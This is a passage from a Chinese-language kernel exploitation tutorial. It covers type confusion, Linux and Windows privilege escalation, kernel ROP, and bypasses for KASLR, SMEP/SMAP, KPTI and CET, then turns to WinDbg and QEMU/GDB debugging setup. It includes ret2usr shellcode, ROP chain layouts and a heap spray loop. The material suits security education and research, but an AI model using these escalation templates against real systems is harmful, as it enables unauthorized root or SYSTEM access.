- 联合体（union）的成员访问与实际设置的类型不匹配
- 不同类型的对象在同一个slab缓存中分配，通过UAF实现类型混淆

#### 4.7.2 利用方法

类型混淆的利用依赖于两种类型的内存布局差异：

1. **找到两种类型A和B，大小相同或相近（可在同一slab中分配）**
2. **类型A有攻击者可控的数据字段**
3. **类型B有敏感的指针或函数指针**
4. **通过UAF或其他方式，让内核将类型A的对象当作类型B使用**
5. **攻击者通过控制类型A中的字段，实现对类型B中敏感字段的控制**

**示例**：如果一个对象有虚函数表指针，而另一个对象的对应偏移是攻击者可控的数据字段，那么类型混淆后就可以劫持虚函数表，实现任意代码执行。

#### 4.7.3 CVE示例

许多著名的内核漏洞都是类型混淆漏洞：
- **CVE-2016-5195（Dirty COW）**：虽然本质是竞态条件，但涉及到对页对象的类型混淆使用
- **CVE-2017-1000112**：Linux内核UDP UFO功能中的类型混淆漏洞
- **CVE-2019-2215**：Android内核的binder驱动类型混淆漏洞

## 第5章 内核漏洞利用技术

内核漏洞利用的最终目标是从用户态权限提升到内核态权限，进而控制系统。本章详细讲解各种内核提权技术。

### 5.1 提权原理

#### 5.1.1 Linux提权基础

**cred结构体**：

Linux内核中，每个进程的权限信息存储在`cred`结构体中（`include/linux/cred.h`）：

```c
struct cred {
    atomic_t    usage;
    kuid_t      uid;        /* real UID */
    kgid_t      gid;        /* real GID */
    kuid_t      suid;       /* saved UID */
    kgid_t      sgid;       /* saved GID */
    kuid_t      euid;       /* effective UID */
    kgid_t      egid;       /* effective GID */
    kuid_t      fsuid;      /* file system UID */
    kgid_t      fsgid;      /* file system GID */
    // ... 其他字段
    struct group_info *group_info;
    kernel_cap_t  cap_inheritable;
    kernel_cap_t  cap_permitted;
    kernel_cap_t  cap_effective;
    kernel_cap_t  cap_bset;
    kernel_cap_t  cap_ambient;
    // ...
};
```

`current->cred`指向当前进程的凭证结构体。提权的核心就是修改当前进程的cred结构体，将uid、euid等设置为0（root），并赋予全部能力（capabilities）。

**`commit_creds`和`prepare_kernel_cred`**：

这两个函数是内核中用于修改进程凭证的标准函数，也是提权利用中最常用的函数：

```c
// 准备一个新的cred结构体（从init进程复制）
struct cred *prepare_kernel_cred(struct task_struct *daemon);

// 将cred应用到当前进程
int commit_creds(struct cred *new);
```

**经典提权代码（内核态执行）**：
```c
typedef int (*commit_creds_t)(struct cred *);
typedef struct cred * (*prepare_kernel_cred_t)(struct task_struct *);

commit_creds_t commit_creds = (commit_creds_t)COMMIT_CREDS_ADDR;
prepare_kernel_cred_t prepare_kernel_cred = (prepare_kernel_cred_t)PREPARE_KERNEL_CRED_ADDR;

commit_creds(prepare_kernel_cred(0));
```

这段代码的含义是：以init进程（PID 0/1）为模板创建一个新的cred（即root权限），然后将其应用到当前进程。

#### 5.1.2 Windows提权基础

**Token机制**：

Windows中进程的权限由访问令牌（Access Token）表示，存储在内核的`TOKEN`对象中。每个进程的`EPROCESS`结构中有一个指向Token的指针。

**提权原理**：
- 找到系统进程（如`System`进程，PID 4）的Token
- 将当前进程的Token替换为System进程的Token
- 或者直接修改当前进程Token的权限字段

**关键结构体**：
- `EPROCESS`：进程内核结构体，包含进程的所有内核态信息
- `KPROCESS`：EPROCESS的内核部分，包含调度相关信息
- `PEB`：进程环境块（用户态可访问）

**EPROCESS中的关键字段（Win10为例）**：
- `ActiveProcessLinks`：双向链表，链接所有活动进程
- `UniqueProcessId`：进程ID
- `Token`：访问令牌
- `ImageFileName`：进程镜像名

**经典提权方法（Token Stealing）**：
1. 通过`PsInitialSystemProcess`或遍历`ActiveProcessLinks`找到System进程
2. 获取System进程的Token
3. 将当前进程的Token替换为System的Token
4. 返回用户态，此时当前进程已具有SYSTEM权限

### 5.2 内核ROP

#### 5.2.1 为什么需要ROP

随着SMEP（内核态禁止执行用户态代码）的普及，传统的ret2usr技术（跳转到用户态shellcode）已失效。攻击者必须在内核态完成所有操作，因此需要使用ROP（Return-Oriented Programming）技术。

内核ROP的核心思想：
- 在内存中的内核代码段（.text）中寻找一系列"gadget"
- 每个gadget以`ret`指令结尾，执行一些有用的操作
- 通过控制栈，将这些gadget串联起来，形成完整的ROP链
- ROP链完成提权操作后，再安全返回用户态

#### 5.2.2 寻找Gadget

常用的ROP gadget搜索工具：
- **ROPgadget**：支持Linux和Windows内核的gadget搜索
- **rp++**：快速ROP gadget搜索工具
- **Ropper**：交互式ROP gadget搜索

**关键gadget类型**：
- 寄存器控制类：`pop rax; ret`、`pop rdi; ret`等
- 内存读写类：`mov [rax], rdi; ret`、`mov rax, [rsi]; ret`等
- 算术运算类：`add rax, rbx; ret`、`xor rax, rax; ret`等
- 栈迁移类：`xchg esp, eax; ret`、`leave; ret`等

#### 5.2.3 绕过SMEP的ROP策略

**方法1：通过ROP直接调用commit_creds(prepare_kernel_cred(0))**

ROP链结构（x86_64示例）：
```
pop rdi; ret          # 将0放入rdi（prepare_kernel_cred的参数）
0
prepare_kernel_cred   # 调用prepare_kernel_cred(0)
pop rdi; ret          # 此时rax中是新的cred指针
                      # 需要将rax的值移动到rdi
                      # （需要一个"mov rdi, rax; ret"或类似gadget）
commit_creds          # 调用commit_creds(new_cred)
swapgs_restore_args   # 准备返回用户态
iretq                 # 返回用户态
```

**方法2：关闭CR4寄存器中的SMEP位**

SMEP由CR4寄存器的第20位控制。如果能清除这一位，SMEP就被禁用了，就可以跳转到用户态shellcode：

```
pop rcx; ret
0x100406e4            # cr4原值 & ~(1<<20)，需要根据实际情况计算
mov cr4, rcx; ret     # 写入cr4，禁用SMEP
user_shellcode_addr   # 跳转到用户态shellcode
```

**注意**：较新的内核中，`mov cr4`指令所在的函数可能受到CFG保护，或者cr4的值受到检查。

#### 5.2.4 返回用户态

ROP链执行完提权操作后，需要安全地返回用户态。x86_64下使用`iretq`指令：

**iretq需要的栈布局**：
```
rip    → 用户态代码地址
cs     → 用户态代码段选择子
rflags → 标志寄存器
rsp    → 用户态栈地址
ss     → 用户态栈段选择子
```

Linux内核中常用的"返回用户态"gadget通常包含`swapgs; iretq`或`swapgs; sysretq`序列。

**注意事项**：
- 返回前必须确保`gs`寄存器正确切换（通过`swapgs`指令）
- 用户态栈必须是有效的
- 返回地址必须是用户态的合法地址
- 修复内核栈，避免内核崩溃

### 5.3 ret2usr

ret2usr（Return to User）是一种传统的内核漏洞利用技术，适用于没有SMEP保护的系统。

#### 5.3.1 原理

1. 用户态准备好提权shellcode
2. 通过内核漏洞控制内核栈上的返回地址
3. 将返回地址设置为用户态shellcode的地址
4. 内核从漏洞函数返回时，跳转到用户态shellcode
5. Shellcode在内核态权限下执行提权操作
6. Shellcode执行完毕后，通过`iret`/`sysret`返回用户态

#### 5.3.2 Linux ret2usr shellcode示例

```c
// 用户态shellcode（在内核态执行）
void __attribute__((naked)) shellcode(void) {
    asm volatile (
        // 保存当前寄存器
        "push rax\n"
        "push rbx\n"
        "push rcx\n"
        "push rdx\n"
        "push rsi\n"
        "push rdi\n"
        "push rbp\n"
        
        // 调用commit_creds(prepare_kernel_cred(0))
        "mov rdi, 0\n"
        "mov rax, %0\n"  // prepare_kernel_cred地址
        "call rax\n"
        "mov rdi, rax\n"
        "mov rax, %1\n"  // commit_creds地址
        "call rax\n"
        
        // 恢复寄存器
        "pop rbp\n"
        "pop rdi\n"
        "pop rsi\n"
        "pop rdx\n"
        "pop rcx\n"
        "pop rbx\n"
        "pop rax\n"
        
        // 返回用户态
        "swapgs\n"
        "iretq\n"
        : : "m"(prepare_kernel_cred), "m"(commit_creds)
    );
}
```

**注意**：在实际利用中，`prepare_kernel_cred`和`commit_creds`的地址需要通过KASLR绕过技术获取。

### 5.4 堆喷与内存布局控制

#### 5.4.1 堆喷的目的

1. **增加可靠性**：堆内存布局通常是不确定的，堆喷可以"铺满"内存，增加漏洞利用的成功率
2. **控制内存内容**：在特定位置放置攻击者可控的数据
3. **为UAF/类型混淆准备占位对象**：释放对象后，用可控数据重新占用

#### 5.4.2 Linux内核堆喷方法

**消息队列（msgqueue）方式**：

```c
// 创建消息队列
int msqid = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);

// 发送消息（分配内核内存）
struct msgbuf {
    long mtype;
    char mtext[1024 - sizeof(long)];
} msg;

msg.mtype = 1;
memset(msg.mtext, 'A', sizeof(msg.mtext));

for (int i = 0; i < 1000; i++) {
    msgsnd(msqid, &msg, sizeof(msg.mtext), 0);
}
```

消息队列的优势：可以精确控制分配的大小（通过mtext长度）和内容。

**其他堆喷方法**：
- **setxattr**：文件扩展属性，可以设置任意大小和内容
- **sendmsg + MSG_CMSG_COMPAT**：控制消息的ancillary data
- **timerfd** / **eventfd** / **signalfd**：创建大量文件描述符
- **mmap + madvise(MADV_DONTNEED)**：用户态内存喷射（配合某些漏洞）

#### 5.4.3 堆布局操纵

**holes（空洞）技术**：
1. 分配大量对象，填满一个slab
2. 间隔释放一些对象，形成空洞
3. 分配目标对象，使其落入空洞中
4. 精确控制目标对象周围的内存布局

**Freelist操控**：
- SLUB分配器的per-cpu freelist是LIFO（后进先出）的
- 最后释放的对象最先被重新分配
- 利用这一特性，可以精确控制哪个对象占用释放的内存

### 5.5 内核地址泄露

#### 5.5.1 为什么需要地址泄露

KASLR将内核的基地址随机化，使得攻击者无法预先知道：
- 内核函数的地址（如commit_creds、prepare_kernel_cred）
- 内核gadget的地址
- 重要数据结构的地址（如current_task、init_task）

因此，内核漏洞利用通常需要一个信息泄露漏洞（信息泄露原语）来获取内核地址，然后才能进行代码执行。

#### 5.5.2 常见泄露方法

**1. 未初始化内存泄露**：

内核从堆或栈上分配内存后未完全初始化，返回给用户态时泄露了其中的旧数据（可能包含内核指针）。

**2. 越界读（OOB Read）**：

通过数组越界读取等漏洞，读取超出缓冲区边界的数据，从中获取内核地址。

**3. format string漏洞**：

内核中的格式化字符串漏洞可以泄露栈上的数据，包括内核指针。

**4. procfs/sysfs信息泄露**：

某些系统文件可能暴露内核地址（如`/proc/kallsyms`、`/proc/modules`）。现代内核通常对普通用户隐藏这些地址。

**5. 侧信道攻击**：

通过 timing side-channel 等方式推断内核地址信息。

#### 5.5.3 利用泄露的地址

一旦获得一个内核地址，就可以通过偏移计算出其他所有内核符号的地址：

```c
// 假设泄露了commit_creds的地址
unsigned long leak_addr = get_leaked_address();

// 计算内核基址（需要知道commit_creds相对于基址的偏移）
unsigned long kernel_base = leak_addr - COMMIT_CREDS_OFFSET;

// 计算其他符号的地址
unsigned long prepare_kernel_cred = kernel_base + PREPARE_KERNEL_CRED_OFFSET;
unsigned long pop_rdi_ret = kernel_base + POP_RDI_RET_OFFSET;
unsigned long swapgs_iretq = kernel_base + SWAPGS_IRETQ_OFFSET;
```

**注意**：偏移量可以通过对内核二进制文件（vmlinux/zImage/ntoskrnl.exe）的分析获得，对于特定内核版本是固定的。

### 5.6 利用原语（Primitives）

内核漏洞利用通常不是一步到位的，而是通过构建各种"原语"逐步达到目标。

#### 5.6.1 任意地址读（Arbitrary Read）

能够读取内核任意地址的数据。用途：
- 泄露内核地址，绕过KASLR
- 读取敏感数据结构（如cred、task_struct）
- 获取后续利用所需的信息

#### 5.6.2 任意地址写（Arbitrary Write）

能够向内核任意地址写入数据。用途：
- 修改函数指针劫持控制流
- 修改cred结构体直接提权
- 修改页表属性
- 关闭安全机制

#### 5.6.3 从原语到提权

**路径1：任意写 → 写cred结构体**
1. 通过任意读泄露current->cred的地址
2. 用任意写将cred中的uid、euid等字段改为0
3. 将capabilities设置为全1

**路径2：任意写 → 写函数指针 → ROP → commit_creds**
1. 找到一个可被触发的函数指针
2. 用任意写修改函数指针为ROP链的起点
3. 触发函数指针调用，执行ROP提权

**路径3：任意写 → 修改页表 → 用户态页映射为内核可写**
1. 修改页表项，使用户态某页在内核态可执行
2. 跳转到用户态shellcode执行提权

#### 5.6.4 常见原语构造方法

**通过list_head覆盖构造任意写**：

经典的"unlink"技术：如果能覆盖链表节点的next和prev指针，那么当链表删除该节点时，会执行类似`next->prev = prev; prev->next = next;`的操作，从而实现任意地址写。

```
// 正常的链表删除操作
node->next->prev = node->prev;
node->prev->next = node->next;

// 如果攻击者控制了node->next和node->prev：
// node->next = target_addr - offset_of_prev
// node->prev = value_to_write
// 那么 node->next->prev = node->prev 就变成了
// *(target_addr) = value_to_write
```

**通过虚函数表覆盖构造代码执行**：

如果能覆盖对象的虚函数表指针（vtable pointer），就可以将其指向伪造的虚函数表。当对象调用虚函数时，就会执行攻击者控制的代码（在有SMEP时需要伪造在可执行的内核内存中）。

## 第6章 内核缓解机制绕过

现代操作系统在内核中部署了层层安全防护机制，攻击者需要逐一绕过才能完成利用。本章详细讲解各类缓解机制的原理及绕过技术。

### 6.1 KASLR绕过技术

#### 6.1.1 KASLR原理

内核地址空间布局随机化（Kernel Address Space Layout Randomization）在系统启动时随机化内核的基地址，使得攻击者无法预测内核代码和数据的位置。

**随机化范围**：
- 内核代码段（.text）基址
- 内核数据段（.data / .bss）基址
- 内核栈位置
- 模块加载基址
- 堆（slab）的随机化（粒度较粗）

**随机化熵**：
- 32位系统：约8-12位熵（几百到几千种可能）
- 64位系统：约20-30位熵（百万到十亿种可能）

#### 6.1.2 信息泄露绕过

最直接、最常用的KASLR绕过方法是利用信息泄露漏洞获取一个内核地址，然后通过偏移计算出所有需要的内核符号地址。

**常见泄露源**：
- **未初始化内存**：内核栈或堆上的局部变量未初始化，返回给用户态时包含旧数据
- **越界读**：数组越界读取到相邻的内核指针
- **/proc/kallsyms**：在未加固的系统中可直接读取内核符号地址
- **dmesg / 内核日志**：某些内核Oops信息会泄露地址
- **网络协议栈**：某些协议实现可能泄露内核地址
- **调试接口**：如`/sys/kernel/debug`下的文件

**泄露后计算偏移**：
```c
// 已知：泄露的地址 leak_addr
// 已知：该符号在内核中的偏移（从vmlinux中提取）symbol_offset
// 求：内核基址 kernel_base

unsigned long kernel_base = leak_addr - symbol_offset;

// 然后计算其他符号地址
unsigned long commit_creds = kernel_base + COMMIT_CREDS_OFFSET;
```

#### 6.1.3 暴力破解

在32位系统中，KASLR的熵较低（通常只有8-10位），可以通过暴力破解绕过。但在64位系统中，暴力破解几乎不可行。

**方法**：
- 利用一个不会导致系统永久崩溃的漏洞（如某些可以重试的用户态触发路径）
- 反复尝试不同的地址，直到猜中
- 每次失败后进程崩溃但系统不崩溃，重新fork进程继续尝试

**适用场景**：
- 32位系统
- 某些特定漏洞（如fork后子进程崩溃，父进程继续）
- 内核重启不影响攻击者的场景

#### 6.1.4 侧信道攻击

利用CPU缓存、TLB等微架构侧信道泄露内核地址信息。

**TLB侧信道**：
- TLB（Translation Lookaside Buffer）是页表缓存
- 访问已映射的地址和未映射的地址在TLB命中率上有差异
- 通过精确测量访问时间，可以推断哪些地址是有效的内核地址

**缓存侧信道**：
- 利用CPU缓存的timing差异
- Flush+Reload、Prime+Probe等技术

**注意**：侧信道攻击通常需要非常精确的计时，且受系统噪声影响较大，实际利用难度较高。

### 6.2 SMEP/SMAP绕过

#### 6.2.1 SMEP原理

SMEP（Supervisor Mode Execution Protection）由CR4寄存器的第20位（SMEP位）控制。当SMEP启用时，如果CPU处于内核态（CPL=0），尝试执行用户态页（U/S位为1）中的代码会触发页错误（#PF）。

**检测SMEP是否启用**：
```c
unsigned long cr4;
asm volatile ("mov %%cr4, %0" : "=r"(cr4));
if (cr4 & (1 << 20)) {
    // SMEP已启用
}
```

#### 6.2.2 SMAP原理

SMAP（Supervisor Mode Access Prevention）由CR4寄存器的第21位（SMAP位）控制。当SMAP启用时，内核态访问用户态数据也会触发页错误。内核必须使用`copy_from_user`/`copy_to_user`等专用函数，这些函数会临时清除AC标志（EFLAGS的第18位）以允许访问。

#### 6.2.3 SMEP绕过方法

**方法1：修改CR4寄存器**

最直接的方法是在内核ROP链中关闭CR4的SMEP位：

```
# ROP链
pop rcx; ret
<cr4_value_without_smep>   # cr4 & ~(1<<20)
mov cr4, rcx; ret
<user_shellcode_addr>       # 现在可以跳转到用户态shellcode了
```

**注意事项**：
- 需要找到包含`mov cr4, rcx; ret`的gadget
- 某些较新的内核会验证CR4的值，不允许随意修改
- Windows的PatchGuard会检测CR4的异常修改

**方法2：使用内核ROP完成所有操作**

如果无法关闭SMEP，就完全在内核态通过ROP完成提权，不依赖用户态代码执行：

```
# ROP链（Linux示例）
pop rdi; ret
0
prepare_kernel_cred_addr    # 调用prepare_kernel_cred(0)
<gadget to move rax to rdi> # 将返回值移到rdi
commit_creds_addr           # 调用commit_creds(new_cred)
swapgs_iretq_gadget         # 返回用户态
```

**方法3：ret2dir（Return-to-Direct Map）**

利用物理内存的直接映射区域（direct map / linear map）。在Linux中，所有物理内存都被映射到内核虚拟地址空间的某个固定偏移（如`PAGE_OFFSET`或`__va()`对应的区域）。

如果攻击者：
1. 可以将shellcode放置到物理内存中（如通过用户态分配的页面，这些页面在物理内存中）
2. 知道物理地址到内核虚拟地址的映射关系
3. 可以跳转到直接映射区域的对应地址

那么即使SMEP启用，由于直接映射区域的页面是内核态页面（U/S位为0），执行其中的代码不会触发SMEP。

**方法4：覆盖函数指针到内核代码**

如果漏洞提供了任意写原语，可以修改某个内核函数指针（如文件操作的`release`回调）为ROP链的起点或特定内核函数。当该函数指针被调用时，控制流转移到攻击者控制的路径，整个过程都在内核态执行。

#### 6.2.4 SMAP绕过方法

SMAP阻止内核态访问用户态数据，绕过方法包括：

**方法1：清除CR4的SMAP位**

与SMEP类似，通过ROP清除CR4的第21位。

**方法2：使用内核栈中转**

将需要的数据先复制到内核栈上（利用漏洞的溢出数据本身就在内核栈上），然后在内核栈上操作。

**方法3：利用内核数据**

所有操作都在内核数据上完成，不访问用户态内存。例如，直接在内核堆上构造伪造对象。

### 6.3 KPTI绕过

#### 6.3.1 KPTI原理

KPTI（Kernel Page Table Isolation，内核页表隔离）是为了缓解Meltdown漏洞而引入的保护机制。它将内核页表和用户态页表完全分离：

- **用户态页表**：只包含用户态地址空间的映射，以及进入内核所需的最小内核映射（如系统调用入口、中断描述符表等）
- **内核态页表**：包含完整的内核地址空间映射

进入内核时（系统调用、中断等）切换到内核页表，返回用户态时切换回用户页表。

**对漏洞利用的影响**：
- KPTI使得从用户态直接读取内核数据（Meltdown类漏洞）变得困难
- 但对于已经获得内核代码执行的情况，KPTI影响不大（因为内核态运行时使用完整的内核页表）

#### 6.3.2 KPTI对利用的影响

**正面影响（对防御者）**：
- 阻止了纯信息泄露类的侧信道攻击（如Meltdown）
- 用户态无法直接访问内核页表映射的大部分内容

**对传统内存破坏漏洞利用的影响有限**：
- 如果漏洞已经允许控制内核态的指令指针，KPTI不影响ROP链的执行
- 内核态执行时拥有完整的内核页表
- 提权操作（修改cred、替换Token等）仍然可行

#### 6.3.3 绕过思路

KPTI本身不是为了阻止内存破坏漏洞利用，而是阻止侧信道信息泄露。对于内存破坏漏洞：

1. **正常执行ROP**：进入内核态后使用完整内核页表，KPTI不构成障碍
2. **利用KPTI trampoline**：KPTI保留的入口trampoline中可能有可利用的gadget
3. **Meltdown + KASLR绕过**：如果系统有Meltdown漏洞但启用了KPTI，需要寻找KPTI的"缝隙"

### 6.4 CET影子栈绕过

#### 6.4.1 CET原理

CET（Control-flow Enforcement Technology）是Intel推出的硬件级控制流完整性保护，包含两个主要部分：

**影子栈（Shadow Stack）**：
- 为每个栈维护一个影子栈，存储返回地址的副本
- `call`指令将返回地址同时压入正常栈和影子栈
- `ret`指令从两个栈弹出返回地址并比较，如果不一致则触发异常
- 影子栈受硬件保护，普通指令无法修改

**间接分支跟踪（IBT）**：
- 要求间接跳转的目标必须是`endbr`指令
- 防止跳转到函数中间（如某些gadget的中间部分）

#### 6.4.2 影子栈对ROP的影响

影子栈直接针对ROP攻击——ROP的核心就是通过控制栈上的返回地址来控制程序流，而影子栈使得修改返回地址会被检测到。

**CET对内核漏洞利用的影响**：
- 传统的基于ret的ROP链被有效阻止
- 基于jmp/call的技巧（如JOP、COP）可能仍然有效
- 需要寻找新的控制流劫持方法

#### 6.4.3 绕过思路

**方法1：寻找影子栈的漏洞**

影子栈本身也存储在内存中，如果有任意写原语，理论上可以同时修改正常栈和影子栈上的返回地址。但影子栈的地址通常是随机化且受保护的。

**方法2：JOP/COP（Jump-Oriented Programming / Call-Oriented Programming）**

不依赖`ret`指令，而是使用间接跳转（jmp）或间接调用（call）来串联gadget：
- 寻找以`jmp rax`、`call rbx`等结尾的gadget
- 通过控制寄存器的值来控制跳转目标
- 这种方式不修改返回地址，不受影子栈保护

**方法3：异常/中断处理路径**

利用异常或中断处理的控制流转移，这些路径可能不完全受CET保护。

**方法4：数据导向编程（DOP）**

不劫持控制流，而是通过修改数据来达到目的。例如：
- 直接修改cred结构体实现提权（需要任意写原语）
- 修改安全相关的变量
- 操纵内核数据结构实现逻辑绕过

**注意**：CET是较新的保护机制，相关的绕过研究仍在快速发展中。实际绕过方法取决于具体的实现细节和漏洞场景。

### 6.5 其他缓解机制

#### 6.5.1 Stack Canary

**原理**：在函数栈帧中返回地址之前放置一个随机的"金丝雀"值，函数返回前检查该值是否被修改。如果被修改，说明发生了栈溢出，触发内核崩溃。

**绕过方法**：
- **泄露Canary值**：通过信息泄露漏洞获取当前栈帧的canary值，然后在溢出数据中包含正确的canary
- **绕过检查**：覆盖异常处理结构，在canary检查触发异常前就劫持控制流
- **逐字节爆破**：利用某些情况下canary可以逐字节猜测的特点（较少适用于内核）

#### 6.5.2 CFG（Control Flow Guard）

**原理**：微软的控制流保护技术，在编译时为所有间接调用目标建立合法目标列表，运行时检查间接调用的目标是否在列表中。

**内核CFG（kCFG）**：Windows 10 1709及以上版本支持内核级CFG。

**绕过方法**：
- 寻找合法的间接调用目标作为"跳板"
- 利用未被CFG保护的函数
- 数据导向攻击（不修改控制流，只修改数据）

#### 6.5.3 Windows PatchGuard

**原理**：PatchGuard（内核补丁保护）定期检查内核关键数据结构的完整性，包括：
- 系统调用表（SSDT）
- 中断描述符表（IDT）
- 全局描述符表（GDT）
- 内核驱动的代码完整性
- 某些关键内核函数

如果检测到修改，系统会触发BSOD（蓝屏死机）。

**对漏洞利用的影响**：
- 不能直接修改SSDT、IDT等关键结构
- 不能直接patch内核代码
- 提权后如果修改了受保护的结构，可能在几分钟内触发蓝屏

**绕过思路**：
- 利用代码执行完成提权后立即恢复（"打一枪换一个地方"）
- 修改不受PatchGuard保护的数据结构
- 利用合法的内核API完成目标，不直接patch内核

## 第7章 内核调试环境搭建

内核漏洞的分析和利用离不开调试环境。本章介绍Windows和Linux内核调试环境的搭建方法，以及常用的调试技巧。

### 7.1 Windows内核调试

#### 7.1.1 WinDbg简介

WinDbg是Windows官方的内核调试工具，功能强大，是Windows内核调试的标准工具。

**版本**：
- **WinDbg (Classic)**：传统版本，随Windows SDK/DDK发布
- **WinDbg Preview**：新版本，基于UWP，界面更现代，功能更丰富
- **kd.exe**：命令行版本的内核调试器

**安装**：
1. 下载Windows SDK（或Windows Driver Kit）
2. 安装时选择Debugging Tools for Windows
3. WinDbg Preview可从Microsoft Store直接安装

#### 7.1.2 双机调试配置

双机调试是最常用的内核调试方式，一台机器作为调试主机（Host）运行WinDbg，另一台作为被调试目标（Target）。

**物理机双机调试**：
- 通过1394火线（已淘汰）
- 通过USB 3.0调试线
- 通过串口（COM端口，速度慢）

**虚拟机双机调试（推荐）**：
- 使用VMware或VirtualBox
- 通过命名管道（Named Pipe）模拟串口
- 设置简单，成本低

**VMware + WinDbg配置步骤**：

1. **在虚拟机（Target）中启用调试模式**：
   ```cmd
   # 查看当前启动项
   bcdedit /enum
   
   # 创建调试启动项（复制当前项）
   bcdedit /copy {current} /d "Debug"
   
   # 启用内核调试
   bcdedit /debug {新创建的项标识符} on
   
   # 设置调试方式为串口，端口1，波特率115200
   bcdedit /dbgsettings serial debugport:1 baudrate:115200
   ```

2. **在VMware中配置串口**：
   - 虚拟机设置 → 添加 → 串行端口
   - 使用命名管道：`\\.\pipe\com_1`
   - 该端是服务器，另一端是应用程序
   - 勾选"轮询时主动放弃CPU"

3. **在主机启动WinDbg**：
   ```
   WinDbg -k com:pipe,port=\\.\pipe\com_1,resets=0
   ```
   或在WinDbg中选择 File → Kernel Debug → COM → 输入端口名

4. **启动虚拟机**：
   - 选择"Debug"启动项
   - WinDbg会在系统启动早期中断下来
   - 输入`g`继续运行

#### 7.1.3 本地内核调试

本地内核调试是在同一台机器上调试当前运行的内核，功能受限（无法设置断点、无法单步），但可以查看内存、结构体等。

**启用本地内核调试**：
```cmd
bcdedit /debug on
bcdedit /dbgsettings local
```

**使用WinDbg进行本地调试**：
1. 以管理员身份运行WinDbg
2. File → Kernel Debug → Local → OK
3. 即可查看内核内存和数据结构

**常用本地调试命令**：
- `!process 0 0`：列出所有进程
- `!drvobj`：查看驱动对象
- `dd` / `dq`：查看内存
- `u` / `uf`：反汇编

#### 7.1.4 常用WinDbg命令

**基础命令**：
- `g`：继续运行（Go）
- `bp <地址>`：设置断点
- `bl`：列出断点
- `bc <编号>`：清除断点
- `p`：单步步过（Step Over）
- `t`：单步步入（Step Into）
- `r`：查看/修改寄存器
- `kv`：查看调用栈

**内存查看**：
- `db <地址>`：以字节形式查看内存
- `dd <地址>`：以双字（32位）形式查看内存
- `dq <地址>`：以四字（64位）形式查看内存
- `du <地址>`：以Unicode字符串形式查看
- `da <地址>`：以ASCII字符串形式查看
- `u <地址>`：反汇编

**扩展命令（!开头）**：
- `!process <地址> <级别>`：查看进程信息
- `!thread <地址>`：查看线程信息
- `!drvobj <驱动名> <级别>`：查看驱动对象
- `!devobj <设备地址>`：查看设备对象
- `!irp <irp地址>`：查看IRP
- `!pool <地址>`：查看池信息
- `!vtop`：虚拟地址转物理地址
- `!pte <地址>`：查看页表项

**符号相关**：
- `.sympath <路径>`：设置符号路径
- `.reload`：重新加载符号
- `x <模块!符号>`：查找符号地址
- `ln <地址>`：列出地址附近的符号

**设置符号服务器**：
```
.sympath SRV*c:\symbols*http://msdl.microsoft.com/download/symbols
```

### 7.2 Linux内核调试

#### 7.2.1 KGDB

KGDB是Linux内核的GDB调试器stub，允许通过串口或网络从另一台机器使用GDB调试内核。

**配置内核**：
需要启用以下内核配置选项：
```
CONFIG_KGDB=y
CONFIG_KGDB_SERIAL_CONSOLE=y  # 串口方式
CONFIG_GDB_SCRIPTS=y
CONFIG_DEBUG_INFO=y
CONFIG_FRAME_POINTER=y
```

**启动参数**：
在grub的kernel参数中添加：
```
kgdboc=ttyS0,115200 kgdbwait
```
- `kgdboc`：指定KGDB使用的串口和波特率
- `kgdbwait`：在内核启动早期等待GDB连接

**连接调试**：
```bash
# 在调试主机上
gdb vmlinux
(gdb) target remote /dev/ttyS0
```

#### 7.2.2 QEMU + GDB

使用QEMU虚拟机调试Linux内核是最灵活、最常用的方式。

**编译调试版内核**：
```bash
# 内核配置
make defconfig
make menuconfig
# 启用：
#   CONFIG_DEBUG_INFO=y
#   CONFIG_GDB_SCRIPTS=y
#   CONFIG_KGDB=y (可选)
#   关闭CONFIG_RANDOMIZE_BASE (关闭KASLR方便调试)

# 编译
make -j$(nproc)
```

**制作根文件系统**：
使用Buildroot或busybox制作最小根文件系统：
```bash
# 使用Buildroot
git clone https://git.buildroot.net/buildroot
cd buildroot
make qemu_x86_64_defconfig
make -j$(nproc)
# 输出在 output/images/rootfs.ext2
```

**启动QEMU并开启GDB调试**：
```bash
qemu-system-x86_64 \
    -kernel linux/arch/x86/boot/bzImage \
    -hda buildroot/output/images/rootfs.ext2 \
    -append "root=/dev/sda console=ttyS0 nokaslr" \
    -nographic \
    -s -S  # -s: 在tcp:1234开启gdbserver; -S: 启动时暂停
```

**连接GDB**：
```bash
gdb linux/vmlinux
(gdb) target remote :1234
(gdb) hb start_kernel  # 设置硬件断点
(gdb) c               # 继续运行
```

**常用GDB调试命令**：
- `b <函数名/地址>`：设置断点
- `hbreak`：硬件断点（在内核调试中更可靠）
- `c`：继续
- `n` / `s`：单步
- `p <变量>`：打印变量
- `x/10gx <地址>`：以16进制查看10个8字节
- `bt`：调用栈
- `info registers`：查看寄存器
- `lx-*`：Linux内核GDB脚本命令（需CONFIG_GDB_SCRIPTS）

#### 7.2.3 kdb

kdb是Linux内核内置的简单调试器，可以直接在目标机器上操作（通过键盘或串口），功能不如KGDB强大，但不需要第二台机器。

**进入kdb**：
- 按`SysRq` + `G`键
- 或使用`echo g > /proc/sysrq-trigger`
- 内核Oops时自动进入

**常用kdb命令**：
- `go`：继续运行
- `bt`：调用栈
- `md <地址>`：查看内存
- `rd`：查看寄存器
- `bp`：设置断点

#### 7.2.4 常用调试工具

**crash工具**：
- 分析内核转储文件（vmcore）
- 支持实时系统分析
- 类似WinDbg的扩展命令集

```bash
# 分析vmcore
crash vmlinux vmcore

# 实时分析
crash /usr/lib/debug/boot/vmlinux-$(uname -r) /dev/mem
```

**ftrace**：
- 内核内置的函数追踪工具
- 无需额外工具，通过`/sys/kernel/debug/tracing`操作
- 可追踪函数调用、函数返回、事件等

```bash
# 追踪某个函数的调用
echo function > /sys/kernel/debug/tracing/current_tracer
echo do_sys_open > /sys/kernel/debug/tracing/set_ftrace_filter
cat /sys/kernel/debug/tracing/trace_pipe
```

**perf**：
- Linux性能分析工具
- 可用于内核代码路径分析
- 支持硬件性能计数器

### 7.3 内核漏洞调试技巧

#### 7.3.1 崩溃分析

**Windows蓝屏分析**：
1. 获取蓝屏转储文件（通常在`C:\Windows\Minidump\`或`C:\Windows\MEMORY.DMP`）
2. 用WinDbg打开转储文件
3. 使用`!analyze -v`命令自动分析
4. 查看崩溃时的调用栈和寄存器

**Linux Oops分析**：
1. 从dmesg或串口输出获取Oops信息
2. Oops信息包含：
   - 崩溃原因（如"unable to handle kernel NULL pointer dereference"）
   - 崩溃地址（RIP）
   - 寄存器状态
   - 调用栈（Call Trace）
